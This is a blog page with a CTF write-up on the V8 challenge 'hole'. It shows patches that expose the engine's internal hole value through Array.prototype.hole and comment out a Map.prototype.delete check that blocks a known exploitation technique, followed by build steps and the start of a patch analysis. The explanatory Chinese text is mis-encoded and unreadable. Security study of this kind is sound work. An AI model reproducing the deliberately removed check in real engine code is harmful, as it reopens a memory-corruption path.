<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
<meta property="og:url" content="http://example.com/page/15/index.html">
<meta property="og:site_name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/15/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>PwnËøõ‰Ω†ÁöÑÂøÉ</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">PwnËøõ‰Ω†ÁöÑÂøÉ</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/" class="post-title-link" itemprop="url">V8ÁéØÂ¢ÉÊê≠Âª∫+JavaScript pwn+hole attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-02 18:44:57 / Modified: 18:46:48" itemprop="dateCreated datePublished" datetime="2022-12-02T18:44:57+08:00">2022-12-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>35k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>32 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>hole Â§çÁé∞</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There<span class="number">&#x27;</span>s a hole in the program ?</span><br><span class="line"></span><br><span class="line">Well I<span class="number">&#x27;</span>m sure it<span class="number">&#x27;</span>s <span class="keyword">not</span> that of a big deal, after all it<span class="number">&#x27;</span>s just a small hole that won<span class="number">&#x27;</span>t <span class="keyword">do</span> any damage right ?</span><br><span class="line"></span><br><span class="line">... Right üò® ?</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊèêÁ§∫‰ø°ÊÅØÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  hole cat README.txt   </span><br><span class="line">* Based on git commit hash: <span class="number">63</span>cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">* args.gn:</span><br><span class="line">dcheck_always_on = <span class="literal">false</span>                                                                                                                                          </span><br><span class="line">is_debug = <span class="literal">false</span></span><br><span class="line">target_cpu = <span class="string">&quot;x64&quot;</span></span><br><span class="line">v8_enable_sandbox = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">* It is recommended that you solve <span class="keyword">this</span> challenge on a Debian Linux <span class="number">11.5</span><span class="number">.0</span> machine.% </span><br></pre></td></tr></table></figure>
<ul>
<li>‰∏§‰∏™ patch Êñá‰ª∂Â¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 6e0cd408e7..aafdfb8544 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -395,6 +395,12 @@</span> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayHole)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).the_hole_value();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">index 78b0229011..55aaaa03df 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="meta">@@ -1763,7 +1763,7 @@</span> TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          &quot;Map.prototype.delete&quot;);</span><br><span class="line"> </span><br><span class="line">   // This check breaks a known exploitation technique. See crbug.com/1263462</span><br><span class="line"><span class="deletion">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"><span class="addition">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   const TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0e98586f7f..28a46f2856 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -413,6 +413,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \</span><br><span class="line"><span class="addition">+  CPP(ArrayHole)                                                               \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index 79bdfbddcf..c42ad4c789 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1722,6 +1722,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtin::kArrayHole:</span></span><br><span class="line"><span class="addition">+      return Type::Oddball();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtin::kArrayBufferIsView:</span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 9040e95202..a77333287a 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1800,6 +1800,7 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtin::kArrayPrototypeFindIndex, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;lastIndexOf&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeLastIndexOf, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;hole&quot;, Builtin::kArrayHole, 0, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;pop&quot;, Builtin::kArrayPrototypePop,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br></pre></td></tr></table></figure>
<ul>
<li>Ê≥®ÂÜå‰∫ÜÁõÆÊ†áÊñπÊ≥ïÔºåÂπ∂‰∏îÁªôÂá∫‰∫Ü‰∏Ä‰∏™ÁΩëÈ°µ <code>crbug.com/1263462</code></li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8-posix.cc b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">index c2571ef3a01..e4f27cfdca6 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="meta">@@ -734,6 +734,7 @@</span> char* Shell::ReadCharsFromTcpPort(const char* name, int* size_out) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line"><span class="addition">+/*    </span></span><br><span class="line">   if (options.enable_os_system) &#123;</span><br><span class="line">     os_templ-&gt;Set(isolate, &quot;system&quot;, FunctionTemplate::New(isolate, System));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">@@ -748,6 +749,7 @@</span> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line">                 FunctionTemplate::New(isolate, MakeDirectory));</span><br><span class="line">   os_templ-&gt;Set(isolate, &quot;rmdir&quot;,</span><br><span class="line">                 FunctionTemplate::New(isolate, RemoveDirectory));</span><br><span class="line"><span class="addition">+*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;  // namespace v8</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index c6bacaa732f..63b3c9c27e8 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3266,6 +3266,7 @@</span> static void AccessIndexedEnumerator(const PropertyCallbackInfo&lt;Array&gt;&amp; info) &#123;&#125;</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line"><span class="meta">@@ -3284,6 +3285,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line"><span class="meta">@@ -3456,6 +3458,7 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateSnapshotTemplate(Isolate* isolate) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; d8_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   &#123;</span><br><span class="line">     Local&lt;ObjectTemplate&gt; file_template = ObjectTemplate::New(isolate);</span><br><span class="line">     file_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line"><span class="meta">@@ -3538,6 +3541,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">                               Local&lt;Signature&gt;(), 1));</span><br><span class="line">     d8_template-&gt;Set(isolate, &quot;serializer&quot;, serializer_template);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   return d8_template;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ê≥®Èáä‰∫ÜÈÉ®ÂàÜÊ∫êÁ†ÅÔºà<code>system</code> Ê≤°‰∫ÜÔºâ</li>
</ul>
<p><strong>ÁéØÂ¢ÉÊê≠Âª∫</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">git checkout 63cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">git apply add_hole.patch</span><br></pre></td></tr></table></figure>
<p>Âú® v8 ÂºïÊìéÁöÑ6.5ÁâàÊú¨‰ª•‰∏äÔºågoogle ÈááÁî®‰∫Ü <code>GN+Ninja</code> ÁöÑÁºñËØëÁªÑÂêàÔºåÂõ†Ê≠§ÈúÄË¶Å‰ª•‰∏ãÂ∑•ÂÖ∑Êù•ÂÆâË£Ö‰æùËµñÔºö</p>
<p>ÂÆâË£Ö depot_tools Â∑•ÂÖ∑ÈõÜÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁÑ∂ÂêéÂ∞Ü <code>depot_tools</code> Âä†ÂÖ•‰Ω†ÁöÑ <code>PATH</code> ÁéØÂ¢ÉÂèòÈáè‰∏≠ÔºàÂÖ∂ÂÆû‰πüÂèØ‰ª•‰∏çÊ∑ªÂä†Ôºâ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/profile.d/yhellow.sh</span><br><span class="line">---------------------------------------</span><br><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂèñÂæó <code>depot_tools</code> ‰πãÂêéÔºåÈúÄË¶ÅÂèñÂæóÂ§ßÈáèÁºñËØë‰æùËµñÔºågoogle Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÊØîËæÉÊñπ‰æøÁöÑÂ∑•ÂÖ∑ <code>gclient</code> Êù•Ëé∑Âèñ‰æùËµñ</li>
<li>ÁÑ∂ÂêéÂú® V8 ÁöÑÁõÆÂΩï‰∏≠ÊâßË°å‰ª•‰∏ã‰ª£Á†ÅÂÆâË£Ö‰æùËµñÔºöÔºàÊ≥®ÊÑèÔºöV8 ÁöÑË∑ØÂæÑ‰∏çËÉΩÊúâ‰∏≠ÊñáÔºâ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br><span class="line">gclient config https://webrtc.googlesource.com/src.git # ÊúÄÂ•ΩÂä†‰∏äËøô‰∏™,‰∏çÁÑ∂‰ºöÂæàÊÖ¢</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
<p>ÂàùÂßãÂåñ‰ª•ÂèäÁºñËØëÔºö</p>
<ul>
<li>v8 ‰ΩøÁî® <code>Ninja</code> ‰Ωú‰∏∫ÁºñËØëÂ∑•ÂÖ∑ÔºåÂêåÊó∂‰ΩøÁî® <code>GN</code> Êù•ÁîüÊàê <code>.ninja</code> Êñá‰ª∂</li>
<li>‰ΩøÁî® <code>v8gen</code> ÂèØ‰ª•ÁîüÊàê‰∏çÂêåÂπ≥Âè∞ÁöÑÁºñËØëÈÖçÁΩÆÊñá‰ª∂Ôºö</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure>
<p>Âú® <code>out.gn/x64.release/args.gn</code> ‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãÂëΩ‰ª§ÔºöÔºàÂ¢ûÊ∑ªË∞ÉËØï‰ø°ÊÅØÔºâ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">symbol_level = <span class="number">2</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>‰ΩøÁî® <code>ninja</code> ÂºÄÂßãÁºñËØëÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C ./out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>ÂèØ‰ª•Áî® <code>find</code> ÂëΩ‰ª§Êù•Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  v8 git:(63cb7fb817) ‚úó find ./ -name d8 -type f</span><br></pre></td></tr></table></figure>
<p>Âè¶Â§ñÔºåV8ËøòÁªô GDB Êèê‰æõ‰∫Ü‰∏Ä‰∫õÂ∑•ÂÖ∑ÔºåÂèØ‰ª•Êää‰ª•‰∏ãËøôË°åÂëΩ‰ª§Ê∑ªÂä†Âà∞ GDB ÁöÑ <code>.gdbinit</code> ‰∏≠Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/yhellow/tools/v8/v8/tools/gdbinit</span><br></pre></td></tr></table></figure>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://chenquan.me/posts/how-to-compile-v8-engine-by-gn/">Â¶Ç‰ΩïÁî®GNÁºñËØëV8ÂºïÊìé</a> </p>
<p><strong>patch ÂàÜÊûê</strong></p>
<p>Á¨¨2‰∏™ patch Â∞±ÊòØÊ≥®Èáä‰∫ÜÊ∫êÁ†ÅÁöÑ‰∏Ä‰∫õÂäüËÉΩÔºàÊöÇÊó∂‰∏çÁî®ÁÆ°Ôºâ</p>
<p>Á¨¨1‰∏™ patch Â∫îËØ•Â∞±ÊòØÊºèÊ¥ûÂà©Áî®ÁöÑÂÖ≥ÈîÆ‰∫ÜÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> Builtin::kArrayHole:</span><br><span class="line">  <span class="keyword">return</span> Type::Oddball();</span><br></pre></td></tr></table></figure>
<ul>
<li>ËøôÈáåËßÑÂÆö <code>Builtin::kArrayHole</code> ËøîÂõû‰∏Ä‰∏™ <code>Oddball</code> ÂºïÁî®Á±ªÂûã</li>
<li><code>oddball</code> ÊòØÊï∞ÊçÆÁ±ªÂûãÁöÑÂºïÁî®ÔºåË°®Á§∫Âú® V8 ‰∏≠ÊÄé‰πàË∞ÉÁî®Áõ∏ÂÖ≥Á±ªÂûãÔºà<code>null undefined true false</code> ÂêàÁß∞‰∏∫ <code>oddball</code>Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleInstallFunction(isolate_, proto, <span class="string">&quot;hole&quot;</span>, Builtin::kArrayHole, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>SimpleInstallFunction</code> ÊØèÊâßË°å‰∏ÄÊ¨°Â∞±ÂÆâË£Ö‰∏Ä‰∏™ API Âà∞ <code>isolate_</code> ‰∏≠ </li>
<li>ËøôÈáåÁõ∏ÂΩì‰∫éÊääÁ¨¶Âè∑ ‚Äúhole‚Äù ÂíåÂáΩÊï∞ <code>Builtin::kArrayHole</code> ÁªëÂÆöÂà∞‰∏ÄËµ∑‰∫Ü</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Âú® patch ‰∏≠Ê≥®Èáä‰∫Ü‰∏Ä‰∏™ <code>CSA_CHECK</code></li>
<li>CodeStubAssemblerÔºåV8 ÁöÑ‰∏Ä‰∏™ÁªÑ‰ª∂ÔºåËØ•ÁªÑ‰ª∂ÂÆö‰πâ‰∫Ü‰∏ÄÁßçÂú® TurboFan ÂêéÁ´ØÊûÑÂª∫ÁöÑÂèØÁßªÊ§çÊ±áÁºñËØ≠Ë®Ä</li>
</ul>
